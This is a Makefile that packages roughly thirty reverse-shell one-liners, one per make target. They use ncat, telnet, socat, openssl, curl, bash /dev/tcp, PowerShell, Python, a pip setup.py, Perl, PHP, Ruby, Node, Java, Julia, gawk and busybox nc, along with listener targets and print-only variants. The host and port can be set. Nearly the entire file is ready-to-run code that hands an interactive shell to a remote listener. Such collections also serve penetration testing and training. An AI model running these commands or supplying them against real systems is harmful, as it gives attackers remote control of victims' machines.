SHELL	:= /bin/bash
HOST	:= 127.0.0.1
PORT	:= 4444
PORT2	:= 4445
TMP	:= /tmp/f

METHODS	:= listener ncat1 ncat2 telnet1 telnet2 socat socket openssl openssl-listener curl curl-listener bash ksh zsh pwsh python3 pip perl cpan php1 php2 php3 php4 php5 php6 lua ruby1 ruby2 irb1 irb2 node jrunscript jjs julia huskell gcc javac awk busybox-nc

BOLD		:= \033[1m
UNDERLINE	:= \033[4m
GREEN		:= \033[32m
BLUE		:= \033[34m
RESET		:= \033[0m

blue=$(tput setaf 4)
normal=$(tput sgr0)

.PHONY: show

show:
	@printf "SHELL: $(GREEN)$(SHELL)$(RESET)\n"
	@printf "HOST: $(GREEN)$(HOST)$(RESET)\n"
	@printf "PORT: $(GREEN)$(PORT)$(RESET)\n"
	@printf "SECOND PORT*: $(GREEN)$(PORT2)$(RESET)\n"
	@printf "TEMPORARY FILE/DIR*: $(GREEN)$(TMP)$(RESET)\n"
	@printf "* = only necessary for some methods\n"
	@printf "\n"
	@printf "To change previous values, run $(UNDERLINE)./configure <shell> <host> <port> <port2> <tmp>$(RESET).\n"
	@printf "\n"
	@printf "Available methods:\n"
	@$(foreach cmd, $(METHODS), printf "   $(BOLD)$(BLUE)$(cmd)$(RESET)\n";)
	@printf "\n"
	@printf "Run $(UNDERLINE)make <method>$(RESET) to use a specific method from the list.\n"
	@printf "Run $(UNDERLINE)make <method>-show$(RESET) to just see the command(s) for a specific method (without running it).\n"


######################### LISTENER #########################

listener:
	nc -lvp $(PORT)

listener-show:
	@printf "nc -lvp $(PORT)\n"

############################################################

########################## NETCAT ##########################

ncat1:
	ncat -e $(SHELL) $(HOST) $(PORT)

ncat1-show:
	@printf "ncat -e $(SHELL) $(HOST) $(PORT)\n"

ncat2:
	mkfifo $(TMP); /bin/bash < $(TMP) 2>&1 | ncat 127.0.0.1 4444 > $(TMP); rm $(TMP)

ncat2-show:
	@printf "mkfifo $(TMP); /bin/bash < $(TMP) 2>&1 | ncat 127.0.0.1 4444 > $(TMP); rm $(TMP)\n"

############################################################

########################## TELNET ##########################

telnet1:
	telnet $(HOST) $(PORT) | $(SHELL) 2>&1 | telnet $(HOST) $(PORT2)

telnet1-show:
	@printf "telnet $(HOST) $(PORT) | $(SHELL) 2>&1 | telnet $(HOST) $(PORT2)\n"

telnet2:
	mkfifo $(TMP); $(SHELL) < $(TMP) 2>&1 | telnet $(HOST) $(PORT) > $(TMP); rm $(TMP)

telnet2-show:
	@printf "mkfifo $(TMP); $(SHELL) < $(TMP) 2>&1 | telnet $(HOST) $(PORT) > $(TMP); rm $(TMP)\n"

############################################################

########################## SOCAT ###########################

socat:
	socat tcp:$(HOST):$(PORT) exec:$(SHELL),stderr

socat-show:
	@printf "socat tcp:$(HOST):$(PORT) exec:$(SHELL),stderr\n"

############################################################

########################## SOCKET ##########################

socket:
	socket -p '$(SHELL)' $(HOST) $(PORT)

socket-show:
	@printf "socket -p '$(SHELL)' $(HOST) $(PORT)\n"

############################################################

########################## OPENSSL #########################

openssl:
	mkfifo $(TMP); $(SHELL) < $(TMP) 2>&1 | openssl s_client -quiet $(HOST):$(PORT) > $(TMP); rm $(TMP)

openssl-show:
	@printf "mkfifo $(TMP); $(SHELL) < $(TMP) 2>&1 | openssl s_client -quiet $(HOST):$(PORT) > $(TMP); rm $(TMP)\n"

openssl-listener:
	openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -noenc
	openssl s_server -quiet -key key.pem -cert cert.pem -port $(PORT)

openssl-listener-show:
	@printf "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -noenc\n"
	@printf "openssl s_server -quiet -key key.pem -cert cert.pem -port $(PORT)\n"

############################################################

########################### CURL ###########################

curl:
	while true; do cmd=$$(curl -s http://$(HOST):$(PORT)); res=$$($(SHELL) -c "$$cmd" 2>&1); curl -X POST -d "$$res" http://$(HOST):$(PORT); done;

curl-show:
	@printf "while true; do cmd=\$$(curl -s http://$(HOST):$(PORT)); res=\$$($(SHELL) -c \"\$$cmd\" 2>&1); curl -X POST -d \"\$$res\" http://$(HOST):$(PORT); done;\n"

curl-listener:
	python -c 'from http.server import BaseHTTPRequestHandler,HTTPServer; H=type("H",(BaseHTTPRequestHandler,),{"do_GET":lambda s:(s.send_response(200),s.end_headers(),s.wfile.write(input("[+] Enter command to execute: ").encode())), "do_POST":lambda s:(s.send_response(200),s.end_headers(),print("[+] Command output:\n"+s.rfile.read(int(s.headers["Content-Length"])).decode()))}); HTTPServer(("0.0.0.0",$(PORT)),H).serve_forever()'

curl-listener-show:
	@printf "python -c 'from http.server import BaseHTTPRequestHandler,HTTPServer; H=type(\"H\",(BaseHTTPRequestHandler,),{\"do_GET\":lambda s:(s.send_response(200),s.end_headers(),s.wfile.write(input(\"[+] Enter command to execute: \").encode())), \"do_POST\":lambda s:(s.send_response(200),s.end_headers(),print(\"[+] Command output:\\\\n\"+s.rfile.read(int(s.headers[\"Content-Length\"])).decode()))}); HTTPServer((\"0.0.0.0\",$(PORT)),H).serve_forever()'\n"

############################################################

########################### BASH ###########################

bash:
	bash -c '$(SHELL) > /dev/tcp/$(HOST)/$(PORT) 2>&1 0>&1'

bash-show:
	@printf "bash -c '$(SHELL) > /dev/tcp/$(HOST)/$(PORT) 2>&1 0>&1'\n"

############################################################

######################## KORNSHELL #########################

ksh:
	ksh -c '$(SHELL) > /dev/tcp/$(HOST)/$(PORT) 2>&1 0>&1'

ksh-show:
	@printf "ksh -c '$(SHELL) > /dev/tcp/$(HOST)/$(PORT) 2>&1 0>&1'\n"

############################################################

######################### Z SHELL ##########################

zsh:
	zsh -c 'zmodload zsh/net/tcp; ztcp -d 3 $(HOST) $(PORT); $(SHELL) 0<&3 1>&3 2>&3'

zsh-show:
	@printf "zsh -c 'zmodload zsh/net/tcp; ztcp -d 3 $(HOST) $(PORT); $(SHELL) 0<&3 1>&3 2>&3'\n"

############################################################

####################### SCHEME SHELL #######################

# TODO

############################################################

######################## POWERSHELL ########################

pwsh:
	pwsh -c '$$TCPClient = New-Object Net.Sockets.TCPClient("$(HOST)", $(PORT)); $$NetworkStream = $$TCPClient.GetStream(); $$StreamReader = New-Object IO.StreamReader($$NetworkStream); $$StreamWriter = New-Object IO.StreamWriter($$NetworkStream); $$StreamWriter.AutoFlush = $$true; $$Buffer = New-Object System.Byte[] 1024; while ($$TCPClient.Connected) { while ($$NetworkStream.DataAvailable) { $$RawData = $$NetworkStream.Read($$Buffer, 0, $$Buffer.Length); $$Code = ([text.encoding]::UTF8).GetString($$Buffer, 0, $$RawData -1) }; if ($$TCPClient.Connected -and $$Code.Length -gt 1) { $$Output = try { Invoke-Expression ($$Code) 2>&1 } catch { $$_ }; $$StreamWriter.Write("$$Output`n"); $$Code = $$null } }; $$TCPClient.Close(); $$NetworkStream.Close(); $$StreamReader.Close(); $$StreamWriter.Close()'

pwsh-show:
	@printf "pwsh -c '\$$TCPClient = New-Object Net.Sockets.TCPClient(\"$(HOST)\", $(PORT)); \$$NetworkStream = \$$TCPClient.GetStream(); \$$StreamReader = New-Object IO.StreamReader(\$$NetworkStream); \$$StreamWriter = New-Object IO.StreamWriter(\$$NetworkStream); \$$StreamWriter.AutoFlush = \$$true; \$$Buffer = New-Object System.Byte[] 1024; while (\$$TCPClient.Connected) { while (\$$NetworkStream.DataAvailable) { \$$RawData = \$$NetworkStream.Read(\$$Buffer, 0, \$$Buffer.Length); \$$Code = ([text.encoding]::UTF8).GetString(\$$Buffer, 0, \$$RawData -1) }; if (\$$TCPClient.Connected -and \$$Code.Length -gt 1) { \$$Output = try { Invoke-Expression (\$$Code) 2>&1 } catch { \$$_ }; \$$StreamWriter.Write(\"\$$Output\`n\"); \$$Code = \$$null } }; \$$TCPClient.Close(); \$$NetworkStream.Close(); \$$StreamReader.Close(); \$$StreamWriter.Close()'\n"

############################################################

########################## PYTHON ##########################

python3:
	python3 -c 'import socket,os; sock = socket.socket(); sock.connect(("$(HOST)",$(PORT))); [os.dup2(sock.fileno(),fd) for fd in (0,1,2)]; os.execvp("$(SHELL)", ["$(SHELL)"])'

python3-show:
	@printf "python3 -c 'import socket,os; sock = socket.socket(); sock.connect((\"$(HOST)\",$(PORT))); [os.dup2(sock.fileno(),fd) for fd in (0,1,2)]; os.execvp(\"$(SHELL)\", [\"$(SHELL)\"])'\n"

############################################################

########################### PIP ############################

pip:
	mkdir -p $(TMP); echo 'import socket,os; sock = socket.socket(); sock.connect(("$(HOST)",$(PORT))); [os.dup2(sock.fileno(),fd) for fd in (0,1,2)]; os.execvp("$(SHELL)", ["$(SHELL)"])' > $(TMP)/setup.py; pip install --break-system-packages $(TMP); rm -r $(TMP)

pip-show:
	@printf "mkdir -p $(TMP); echo 'import socket,os; sock = socket.socket(); sock.connect((\"$(HOST)\",$(PORT))); [os.dup2(sock.fileno(),fd) for fd in (0,1,2)]; os.execvp(\"$(SHELL)\", [\"$(SHELL)\"])' > $(TMP)/setup.py; pip install --break-system-packages $(TMP); rm -r $(TMP)\n"

############################################################

########################### PERL ###########################

perl:
	perl -e 'use Socket; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); connect(S,sockaddr_in($(PORT),inet_aton("$(HOST)"))); open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("$(SHELL)");'

perl-show:
	@printf "perl -e 'use Socket; socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\")); connect(S,sockaddr_in($(PORT),inet_aton(\"$(HOST)\"))); open(STDIN,\">&S\"); open(STDOUT,\">&S\"); open(STDERR,\">&S\"); exec(\"$(SHELL)\");'\n"

############################################################

########################### CPAN ###########################

cpan:
	echo '! use Socket; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); connect(S,sockaddr_in($(PORT),inet_aton("$(HOST)"))); open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("$(SHELL)");' | cpan

cpan-show:
	@printf "echo '! use Socket; socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\")); connect(S,sockaddr_in($(PORT),inet_aton(\"$(HOST)\"))); open(STDIN,\">&S\"); open(STDOUT,\">&S\"); open(STDERR,\">&S\"); exec(\"$(SHELL)\");' | cpan\n"

############################################################

############################ PHP ###########################

php1:
	php -r '$$sock = fsockopen("$(HOST)",$(PORT)); proc_open("$(SHELL)", array(0=>$$sock, 1=>$$sock, 2=>$$sock),$$pipes);'

php1-show:
	@printf "php -r '\$$sock = fsockopen(\"$(HOST)\",$(PORT)); proc_open(\"$(SHELL)\", array(0=>\$$sock,1=>\$$sock,2=>\$$sock), \$$pipes);'\n"

php2:
	php -r '$$sock = fsockopen("$(HOST)",$(PORT)); exec("$(SHELL) <&3 >&3 2>&3");'

php2-show:
	@printf "php -r '\$$sock = fsockopen(\"$(HOST)\",$(PORT)); exec(\"$(SHELL) <&3 >&3 2>&3\");'\n"

php3:
	php -r '$$sock = fsockopen("$(HOST)",$(PORT)); system("$(SHELL) <&3 >&3 2>&3");'

php3-show:
	@printf "php -r '\$$sock = fsockopen(\"$(HOST)\",$(PORT)); system(\"$(SHELL) <&3 >&3 2>&3\");'\n"

php4:
	php -r '$$sock = fsockopen("$(HOST)",$(PORT)); shell_exec("$(SHELL) <&3 >&3 2>&3");'

php4-show:
	@printf "php -r '\$$sock = fsockopen(\"$(HOST)\",$(PORT)); shell_exec(\"$(SHELL) <&3 >&3 2>&3\");'\n"

php5:
	php -r '$$sock = fsockopen("$(HOST)",$(PORT)); passthru("$(SHELL) <&3 >&3 2>&3");'

php5-show:
	@printf "php -r '\$$sock = fsockopen(\"$(HOST)\",$(PORT)); passthru(\"$(SHELL) <&3 >&3 2>&3\");'\n"

php6:
	php -r '$$sock = fsockopen("$(HOST)",$(PORT)); popen("$(SHELL) <&3 >&3 2>&3", "r");'

php6-show:
	@printf "php -r '\$$sock = fsockopen(\"$(HOST)\",$(PORT)); popen(\"$(SHELL) <&3 >&3 2>&3\", \"r\");'\n"

############################################################

############################ LUA ###########################

lua:
	lua -e 'socket = require("socket"); socket.tcp():connect("$(HOST)",$(PORT)); os.execute("$(SHELL) <&3 >&3 2>&3");'

lua-show:
	@printf "lua -e 'socket = require(\"socket\"); socket.tcp():connect(\"$(HOST)\",$(PORT)); os.execute(\"$(SHELL) <&3 >&3 2>&3\");'\n"

############################################################

########################### RUBY ###########################

ruby1:
	ruby -e 'require "socket"; sock = TCPSocket.new("$(HOST)",$(PORT)); STDIN.reopen(sock); STDOUT.reopen(sock); STDERR.reopen(sock); exec "$(SHELL)"'

ruby1-show:
	@printf "ruby -e 'require \"socket\"; sock = TCPSocket.new(\"$(HOST)\",$(PORT)); STDIN.reopen(sock); STDOUT.reopen(sock); STDERR.reopen(sock); exec \"$(SHELL)\"'\n"

ruby2:
	ruby -e 'require "socket"; sock = TCPSocket.new("$(HOST)",$(PORT)); while(cmd = sock.gets); IO.popen(cmd,"r"){|io| sock.print io.read} end'

ruby2-show:
	@printf "ruby -e 'require \"socket\"; sock = TCPSocket.new(\"$(HOST)\",$(PORT)); while(cmd = sock.gets); IO.popen(cmd,\"r\"){|io| sock.print io.read} end'\n"

############################################################

############################ IRB ###########################

irb1:
	echo 'require "socket"; sock = TCPSocket.new("$(HOST)",$(PORT)); STDIN.reopen(sock); STDOUT.reopen(sock); STDERR.reopen(sock); exec "$(SHELL)"' | irb

irb1-show:
	@printf "echo 'require \"socket\"; sock = TCPSocket.new(\"$(HOST)\",$(PORT)); STDIN.reopen(sock); STDOUT.reopen(sock); STDERR.reopen(sock); exec \"$(SHELL)\"' | irb\n"

irb2:
	echo 'require "socket"; sock = TCPSocket.new("$(HOST)",$(PORT)); while(cmd = sock.gets); IO.popen(cmd,"r"){|io| sock.print io.read} end' | irb

irb2-show:
	@printf "echo 'require \"socket\"; sock = TCPSocket.new(\"$(HOST)\",$(PORT)); while(cmd = sock.gets); IO.popen(cmd,\"r\"){|io| sock.print io.read} end' | irb\n"

############################################################

########################### NODE ###########################

node:
	node -e 'shell = require("child_process").spawn("$(SHELL)"); require("net").connect($(PORT), "$(HOST)", function () { this.pipe(shell.stdin); shell.stdout.pipe(this); shell.stderr.pipe(this); })'

node-show:
	@printf "node -e 'shell = require(\"child_process\").spawn(\"$(SHELL)\"); require(\"net\").connect($(PORT), \"$(HOST)\", function () { this.pipe(shell.stdin); shell.stdout.pipe(this); shell.stderr.pipe(this); })'\n"

############################################################

######################## JRUNSCRIPT ########################

jrunscript:
	jrunscript -e 'var sock = new java.net.Socket("$(HOST)",$(PORT)); var proc = new java.lang.ProcessBuilder("$(SHELL)").redirectErrorStream(true).start(); var pi = proc.getInputStream(), po = proc.getOutputStream(), si = sock.getInputStream(), so = sock.getOutputStream(); while(!sock.isClosed()){ while(pi.available()>0) so.write(pi.read()); while(si.available()>0) po.write(si.read()); so.flush(); po.flush(); }; proc.destroy(); sock.close();'

jrunscript-show:
	@printf "jrunscript -e 'var sock = new java.net.Socket(\"$(HOST)\",$(PORT)); var proc = new java.lang.ProcessBuilder(\"$(SHELL)\").redirectErrorStream(true).start(); var pi = proc.getInputStream(), po = proc.getOutputStream(), si = sock.getInputStream(), so = sock.getOutputStream(); while(!sock.isClosed()){ while(pi.available()>0) so.write(pi.read()); while(si.available()>0) po.write(si.read()); so.flush(); po.flush(); }; proc.destroy(); sock.close();'\n"

############################################################

############################ JJS ###########################

jjs:
	echo 'var sock = new java.net.Socket("$(HOST)",$(PORT)); var proc = new java.lang.ProcessBuilder("$(SHELL)").redirectErrorStream(true).start(); var pi = proc.getInputStream(), po = proc.getOutputStream(), si = sock.getInputStream(), so = sock.getOutputStream(); while(!sock.isClosed()){ while(pi.available()>0) so.write(pi.read()); while(si.available()>0) po.write(si.read()); so.flush(); po.flush(); }; proc.destroy(); sock.close();' | jjs

jjs-show:
	@printf "echo 'var sock = new java.net.Socket(\"$(HOST)\",$(PORT)); var proc = new java.lang.ProcessBuilder(\"$(SHELL)\").redirectErrorStream(true).start(); var pi = proc.getInputStream(), po = proc.getOutputStream(), si = sock.getInputStream(), so = sock.getOutputStream(); while(!sock.isClosed()){ while(pi.available()>0) so.write(pi.read()); while(si.available()>0) po.write(si.read()); so.flush(); po.flush(); }; proc.destroy(); sock.close();' | jjs\n"

############################################################

########################## JULIA ###########################

julia:
	julia -e 'using Sockets; sock = connect("$(HOST)", parse(Int64,"$(PORT)")); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'

julia-show:
	@printf "julia -e 'using Sockets; sock = connect(\"$(HOST)\", parse(Int64,\"$(PORT)\")); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(\`\$$cmd\`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'\n"

############################################################

########################### GCC ############################

C_CODE := src/reverse_shell.c

gcc:
	gcc $(C_CODE) -o out -DHOST="\"$(HOST)\"" -DPORT=$(PORT) -DSHELL="\"$(SHELL)\""; ./out; rm ./out

gcc-show:
	@printf "gcc $(C_CODE) -o out -DHOST=\"\\\\\"$(HOST)\\\\\"\" -DPORT=$(PORT) -DSHELL=\"\\\\\"$(SHELL)\\\\\"\"; ./out; rm ./out\n"

############################################################

########################## JAVAC ###########################

JAVA_CODE := src/ReverseShell.java
JAVA_BYTECODE := ReverseShell

javac:
	javac -d . $(JAVA_CODE); java $(JAVA_BYTECODE) $(HOST) $(PORT) $(SHELL); rm $(JAVA_BYTECODE).class

javac-show:
	@printf "javac -d . $(JAVA_CODE); java $(JAVA_BYTECODE) $(HOST) $(PORT) $(SHELL); rm $(JAVA_BYTECODE).class\n"

############################################################

########################### GAWK ###########################

gawk:
	gawk 'BEGIN { sock = "/inet/tcp/0/$(HOST)/$(PORT)"; while (1) { if ((sock |& getline c) <= 0) break; while (c && (c " 2>&1" |& getline res) > 0) print res |& sock; close(c)}}'

gawk-show:
	@printf "gawk 'BEGIN { sock = \"/inet/tcp/0/$(HOST)/$(PORT)\"; while (1) { if ((sock |& getline c) <= 0) break; while (c && (c \" 2>&1\" |& getline res) > 0) print res |& sock; close(c)}}'\n"

############################################################

######################## BUSYBOX-NC ########################

busybox-nc:
	busybox nc $(HOST) $(PORT) -e $(SHELL)

busybox-nc-show:
	@printf "busybox nc $(HOST) $(PORT) -e $(SHELL)\n"

############################################################
